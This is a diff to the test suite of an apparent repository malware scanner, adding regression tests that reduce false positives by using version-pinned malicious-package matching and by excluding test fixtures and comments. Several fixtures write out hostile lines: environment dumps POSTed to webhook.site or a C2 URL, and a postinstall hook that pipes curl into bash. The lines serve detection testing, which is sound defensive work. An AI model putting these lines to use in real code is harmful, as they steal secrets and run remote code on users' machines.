@@ -155,23 +155,43 @@ def test_legit_setup_py_build_does_not_confirm(tmp_path):
 
 def test_malicious_dependency_confirms(tmp_path):
     # A lure repo's own code is benign, but it declares a known-malicious package
-    # -> installs malware on `npm install`. Tier-A confirmation.
+    # AT THE EXACT COMPROMISED VERSION -> installs malware on `npm install`.
+    # Tier-A confirmation.
     (tmp_path / "package.json").write_text(
         json.dumps({"name": "wallet-task",
                     "dependencies": {"@evil/stealer": "1.0.0", "react": "18"}}),
         encoding="utf-8",
     )
-    res = analyze_repo(tmp_path, "attacker/crypto-task",
-                       malicious_packages={"npm": frozenset({"@evil/stealer"})})
+    res = analyze_repo(
+        tmp_path, "attacker/crypto-task",
+        malicious_packages={"npm": {"@evil/stealer": frozenset({"1.0.0"})}})
     assert res.confirmed
     assert any(f.category == "malicious_dependency" for f in res.bash_findings)
 
 
+def test_malicious_dependency_version_mismatch_does_not_confirm(tmp_path):
+    # The mastra-ai/mastra + Shai-Hulud-worm FP (eval finding, 2026-07-02): OSM
+    # flags posthog-js@1.297.3 SPECIFICALLY as compromised (a maintainer-account
+    # takeover pushed one bad release of an otherwise legitimate, widely-used
+    # package). Matching on the NAME ALONE confirmed every user of the package at
+    # any version, including a 25k-star legitimate project. A repo depending on
+    # ANY OTHER version must not confirm.
+    (tmp_path / "package.json").write_text(
+        json.dumps({"name": "app", "dependencies": {"posthog-js": "^1.300.0"}}),
+        encoding="utf-8",
+    )
+    res = analyze_repo(
+        tmp_path, "legit/app",
+        malicious_packages={"npm": {"posthog-js": frozenset({"1.297.3"})}})
+    assert not res.confirmed
+
+
 def test_malicious_pip_requirement_confirms(tmp_path):
     (tmp_path / "requirements.txt").write_text(
-        "requests==2.31.0\nevil-stealer-pkg>=1.3\n", encoding="utf-8")
-    res = analyze_repo(tmp_path, "a/b",
-                       malicious_packages={"pypi": frozenset({"evil-stealer-pkg"})})
+        "requests==2.31.0\nevil-stealer-pkg==1.3\n", encoding="utf-8")
+    res = analyze_repo(
+        tmp_path, "a/b",
+        malicious_packages={"pypi": {"evil-stealer-pkg": frozenset({"1.3"})}})
     assert res.confirmed
 
 
@@ -183,8 +203,9 @@ def test_dependency_match_is_ecosystem_scoped(tmp_path):
         encoding="utf-8",
     )
     # "webpack-dev-server" is flagged on pypi here, NOT npm -> must not confirm.
-    res = analyze_repo(tmp_path, "legit/app",
-                       malicious_packages={"pypi": frozenset({"webpack-dev-server"})})
+    res = analyze_repo(
+        tmp_path, "legit/app",
+        malicious_packages={"pypi": {"webpack-dev-server": frozenset({"4.0.0"})}})
     assert not res.confirmed
 
 
@@ -193,8 +214,9 @@ def test_benign_dependencies_do_not_confirm(tmp_path):
         json.dumps({"name": "app", "dependencies": {"react": "18", "axios": "1"}}),
         encoding="utf-8",
     )
-    res = analyze_repo(tmp_path, "legit/app",
-                       malicious_packages={"npm": frozenset({"@evil/stealer"})})
+    res = analyze_repo(
+        tmp_path, "legit/app",
+        malicious_packages={"npm": {"@evil/stealer": frozenset({"1.0.0"})}})
     assert not res.confirmed
 
 
@@ -299,6 +321,10 @@ def test_is_security_data_file_predicate():
     from git_warden.scanning.bash_scanner import is_ignored_path, is_security_data_file
     assert is_security_data_file("malware_patterns.py")
     assert is_security_data_file("adv_malware_raw.json")
+    # cobenian/shai-hulud-detect + idox-genai/shai-hulud-scanner FPs (2026-07-02):
+    # a worm DETECTOR's own list of compromised package names.
+    assert is_security_data_file("compromised-packages.txt")
+    assert is_security_data_file("ioc-packages-custom.csv")
     assert is_ignored_path(Path("pkgward/analyze/malware_patterns.py"))
     # Real payload filenames are NOT treated as security data.
     assert not is_security_data_file("postcss.config.js")
@@ -335,6 +361,41 @@ def test_test_fixture_files_excluded_from_confirmation(tmp_path):
     assert analyze_repo(tmp_path, "evil/lib").confirmed           # same code, shipped
 
 
+def test_env_dump_requires_whole_object_not_named_property(tmp_path):
+    # The mastra-ai/mastra FP (2026-07-02): JSON.stringify(process.env.NODE_ENV)
+    # is standard webpack/bundler dead-code-elimination boilerplate present in
+    # nearly every JS build, carrying no secret. Only JSON.stringify(process.env)
+    # -- the WHOLE object -- is a genuine credential-access signal.
+    (tmp_path / "webpack.config.js").write_text(
+        "new DefinePlugin({"
+        "'process.env.NODE_ENV': JSON.stringify(process.env.NODE_ENV || 'development')"
+        "});\n",
+        encoding="utf-8",
+    )
+    assert not analyze_repo(tmp_path, "legit/app").confirmed
+
+
+def test_env_dump_python_word_boundary_excludes_postgres(tmp_path):
+    # The mem0ai/mem0 + thuir/memorybench FP (2026-07-02): the os.environ rule's
+    # "post" alternative matched unbounded, so "POST" inside "POSTGRES_HOST"
+    # confirmed ordinary DB config code as a credential-exfil signal.
+    (tmp_path / "db.py").write_text(
+        'host = os.environ.get("POSTGRES_HOST", "postgres")\n'
+        'password = os.environ.get("POSTGRES_PASSWORD", "postgres")\n',
+        encoding="utf-8",
+    )
+    assert not analyze_repo(tmp_path, "legit/app").confirmed
+
+
+def test_env_dump_python_still_catches_real_exfil(tmp_path):
+    # The genuine attack the rule exists for: os.environ shipped out via a real
+    # POST/send/requests call on the same line must still confirm.
+    (tmp_path / "steal.py").write_text(
+        "dump = os.environ; requests.post(c2_url, json=dict(dump))\n", encoding="utf-8"
+    )
+    assert analyze_repo(tmp_path, "evil/lib").confirmed
+
+
 def test_examples_dir_excluded_from_confirmation(tmp_path):
     ex = tmp_path / "examples"
     ex.mkdir()
@@ -342,6 +403,47 @@ def test_examples_dir_excluded_from_confirmation(tmp_path):
         "const p = eval(atob('Y29uc29sZQ=='));\n", encoding="utf-8"
     )
     assert not analyze_repo(tmp_path, "lib/with-examples").confirmed
+
+
+def test_go_test_file_excluded_from_confirmation(tmp_path):
+    # The garagon/aguara FP (2026-07-02): a security scanner's Go `*_test.go`
+    # fixtures carry attack strings the tool tests itself against. Go's test
+    # convention is `_test.go`, which the JS-style `.test.` markers missed.
+    (tmp_path / "jsrisk_test.go").write_text(
+        'func TestX(t *testing.T){ s := "JSON.stringify(process.env)" ; _ = s }\n',
+        encoding="utf-8",
+    )
+    assert not analyze_repo(tmp_path, "vendor/scanner").confirmed
+    # ...but the identical string in a shipped (non-test) file still confirms.
+    (tmp_path / "steal.js").write_text(
+        "fetch(u,{method:'POST',body:JSON.stringify(process.env)});\n", encoding="utf-8")
+    assert analyze_repo(tmp_path, "evil/lib").confirmed
+
+
+def test_comment_line_does_not_confirm(tmp_path):
+    # The garagon/aguara FP (2026-07-02): `// Whole-environment exfil
+    # (JSON.stringify(process.env)` is a scanner DOCUMENTING the pattern, not
+    # executing it. A comment can never confirm; real code with it does.
+    (tmp_path / "engine.go").write_text(
+        '// exfil shape: JSON.stringify(process.env) piped to a webhook\n'
+        'func scan() {}\n', encoding="utf-8")
+    assert not analyze_repo(tmp_path, "vendor/scanner").confirmed
+    (tmp_path / "real.js").write_text(
+        "const b = JSON.stringify(process.env); send(b);\n", encoding="utf-8")
+    assert analyze_repo(tmp_path, "evil/lib").confirmed
+
+
+def test_test_cases_dir_excluded_from_confirmation(tmp_path):
+    # The cobenian/shai-hulud-detect FP (2026-07-02): a worm DETECTOR ships
+    # deliberately crafted attack-simulation fixtures under test-cases/ to prove
+    # its own detection works. That is a demo payload, not the repo's real code.
+    tc = tmp_path / "test-cases" / "infected-project"
+    tc.mkdir(parents=True)
+    (tc / "malicious.js").write_text(
+        "fetch('https://webhook.site/x',{method:'POST',body:JSON.stringify(process.env)});\n",
+        encoding="utf-8",
+    )
+    assert not analyze_repo(tmp_path, "cobenian/shai-hulud-detect").confirmed
 
 
 def test_run_external_guarddog_flags_on_issues(monkeypatch, tmp_path):
@@ -357,3 +459,67 @@ def test_run_external_guarddog_flags_on_issues(monkeypatch, tmp_path):
         return R()
 
     assert t2._run_external("guarddog", tmp_path, runner) == "flagged"
+
+
+# --- 2026-07-02 detection-audit regressions: dual-use rules demoted from Tier-A
+# confirm-alone must NOT confirm a repo by themselves; real attacks still do. ---
+
+def test_audit_dualuse_signals_do_not_confirm(tmp_path):
+    # Each of these is ordinary, legitimate code the audit proved was confirming
+    # a repo as malware ALONE. None may confirm now.
+    (tmp_path / "wait.sh").write_text(  # wait-for-port healthcheck
+        "#!/bin/bash\nuntil (echo > /dev/tcp/db/5432) 2>/dev/null; do sleep 1; done\n",
+        encoding="utf-8")
+    (tmp_path / "crypto.py").write_text(  # AES key literal (hex blob)
+        'KEY = b"\x2b\x7e\x15\x16\x28\xae\xd2\xa6\xab\xf7\x15\x88\x09\xcf\x4f\x3c"\n',
+        encoding="utf-8")
+    (tmp_path / "build.js").write_text(  # fromCharCode string builder
+        "const s = String.fromCharCode(72,101,108,108,111,44,32,87,111,114,108,100);\n",
+        encoding="utf-8")
+    (tmp_path / "debug.sh").write_text(  # gdb backtrace + ptrace self-check
+        "#!/bin/bash\ngdb -p $(pgrep app) -batch -ex bt\ngrep ptrace /proc/self/status\n",
+        encoding="utf-8")
+    (tmp_path / "Dockerfile").write_text(  # OpenShift nss_wrapper preload
+        "ENV LD_PRELOAD=/usr/lib64/libnss_wrapper.so\n", encoding="utf-8")
+    res = analyze_repo(tmp_path, "legit/infra")
+    assert not res.confirmed, [f"{f.category}/{f.rule}" for f in res.confirming_findings]
+
+
+def test_npm_hook_shell_script_call_does_not_confirm(tmp_path):
+    # `postinstall: bash ./scripts/install.sh` is ordinary build tooling, not a
+    # supply-chain attack. Only fetch/decode-and-run confirms.
+    (tmp_path / "package.json").write_text(
+        json.dumps({"name": "app", "scripts": {"postinstall": "bash ./scripts/install.sh"}}),
+        encoding="utf-8")
+    assert not analyze_repo(tmp_path, "legit/app").confirmed
+
+
+def test_npm_hook_curl_pipe_bash_confirms(tmp_path):
+    # The actual attack shape (fetch-and-run in a lifecycle hook) still confirms.
+    (tmp_path / "package.json").write_text(
+        json.dumps({"name": "evil", "scripts": {
+            "postinstall": "curl https://x.tld/a.sh | bash"}}), encoding="utf-8")
+    assert analyze_repo(tmp_path, "evil/lure").confirmed
+
+
+def test_setup_py_pip_index_url_does_not_confirm(tmp_path):
+    # A setup.py that shells out to `pip install --index-url https://...` is
+    # normal ML/CUDA packaging, not download-and-run malware.
+    (tmp_path / "setup.py").write_text(
+        "import subprocess, sys\n"
+        "subprocess.check_call([sys.executable,'-m','pip','install','flash-attn',"
+        "'--index-url','https://download.pytorch.org/whl/cu118'])\n", encoding="utf-8")
+    assert not analyze_repo(tmp_path, "legit/ml").confirmed
+
+
+def test_dependency_caret_range_does_not_confirm(tmp_path):
+    # ^1.2.3 floats to the latest patched release, NOT the one compromised
+    # version, so a caret range must not confirm even when the pinned base equals
+    # the compromised version. An exact pin of the same version DOES confirm.
+    pkg = {"name": "app", "dependencies": {"evil-pkg": "^1.2.3"}}
+    (tmp_path / "package.json").write_text(json.dumps(pkg), encoding="utf-8")
+    mal = {"npm": {"evil-pkg": frozenset({"1.2.3"})}}
+    assert not analyze_repo(tmp_path, "legit/app", malicious_packages=mal).confirmed
+    (tmp_path / "package.json").write_text(
+        json.dumps({"name": "app", "dependencies": {"evil-pkg": "1.2.3"}}), encoding="utf-8")
+    assert analyze_repo(tmp_path, "evil/lure", malicious_packages=mal).confirmed
